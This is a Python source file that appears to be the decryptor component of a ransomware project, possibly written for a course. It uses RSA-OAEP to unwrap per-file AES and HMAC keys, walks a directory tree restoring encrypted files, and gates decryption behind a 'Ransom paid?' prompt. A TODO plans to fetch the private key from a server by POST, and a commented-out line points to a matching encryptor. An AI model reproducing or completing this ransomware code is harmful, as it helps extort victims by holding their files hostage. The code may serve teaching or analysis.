from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes, hmac
import os
import json
import constants
import AES_Encrypt as a
from base64 import b64encode, b64decode



def LoadRSAPrivateKey(filepath):
    """
    Loads data from filepath and returns private key
    INPUT:  filepath - (str) path to private key from constants
    OUTPUT: private_key - (rsa) data of private key
    """
    with open(filepath,"rb") as file:
        private_key = serialization.load_pem_private_key(
            file.read(),
            password = None,
            backend = default_backend()
        )
    return private_key



def LoadRSAPublicKey(filepath):
    """
    Loads data from filepath and returns public key
    INPUT:  filepath - (str) path to private key from constants
    OUTPUT: private_key - (rsa) data of public key
    """
    with open(filepath,"rb") as file:
        public_key = serialization.load_pem_public_key(
            file.read(),
            backend = default_backend())
    return public_key       



def MyRSAFileDecrypt(filepath):
    """  
    Decrypts a file from specified filepath.
    Reads values of RSACipher, C, IV, tag, ext from json file.
    Deletes json file and replaces with original decrypted file
    INPUT:  filepath - (str) path to json file with data
    OUTPUT: plaintext - (bytes) decrypted message

    """
    RSACipher, C, IV, tag, ext = readFromJSON(filepath) # getting values with file name

     # TODO: get private key here from POST
    public_key = LoadRSAPublicKey(constants.RSA_PUBLIC_KEY_PATH)    # use to get private key in post

    private_key = LoadRSAPrivateKey(constants.RSA_PRIVATE_KEY_PATH) # for now
   
    keys = private_key.decrypt(
        RSACipher,
        padding.OAEP(
            mgf= padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    EncKey = keys[:constants.KEY_LEN]   
    HMACKey = keys[constants.HMAC_KEY_LEN:]

    plaintext = a.MyFileDecrypt(filepath, C, IV, tag, EncKey, HMACKey, ext)
    makeFile(plaintext, filepath, ext)  # creates original decrypted file
    os.remove(filepath)     # removes json file with encrypted data

    return plaintext



def readFromJSON(filepath):
    """
    Returns values stored in a json file
    INPUT:  filepath - (str) path to json of file
    OUTPUT:  (RSACipher, C, IV, tag, ext)

    """
    with open(filepath) as json_file:  
        data = json.load(json_file)
    json_file.close()

    RSACipher = b64decode(data["RSACipher"])
    C = b64decode(data["C"])
    IV = b64decode(data["IV"])
    tag = b64decode(data["tag"])
    ext = data["ext"] 

    return RSACipher, C, IV, tag, ext


def makeFile(m, filepath, ext):
    """
    Creates a file given the decrypted plaintext m
    INPUT:  m - (bytes) plaintext
            fileName -  (str) name of file with extension 
    """
    newPath = filepath.split(".")
    newPath.pop()
    newPath = ".".join(newPath) + "." + ext

    out_file = open(newPath, "wb") # writing decrypted message to file
    out_file.write(m)
    out_file.close()


def decrypt_all_files(root):
    for rt, dirs, files in os.walk(root):   # root, directories, files
        for f in files:
            if f[0] != '.':  # not looking at hidden files
                MyRSAFileDecrypt(os.path.join(rt, f))
    print('Files Decrypted')



def main():
    root = 'test-files/'
    # root = os.getcwd()
    
    # enc = input('Encrypt? (y/n): ')
    # if enc == 'y':
    #     encrypt_all_files(root)
    
    paid = input('Ransom paid? (y/n): ')
    # paid = 'y'
    if paid == 'y':
        decrypt_all_files(root)



main()


